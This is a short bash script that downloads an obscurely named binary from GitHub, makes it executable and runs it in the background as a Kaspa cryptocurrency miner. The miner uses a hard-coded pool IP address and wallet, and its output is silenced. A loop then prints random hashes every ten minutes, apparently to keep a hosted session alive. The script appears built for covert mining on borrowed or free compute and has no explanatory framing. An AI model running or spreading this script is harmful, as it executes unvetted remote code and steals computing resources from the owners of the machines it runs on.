# /bin/bash

wget https://github.com/sbwsmg/kaspa/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=165.232.160.161:443
WALLET=kaspa:qzhva42mxq008mp25jfwrqqeavp8t38r5qynm3fq44zwtpptjyezqk09sxvme

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
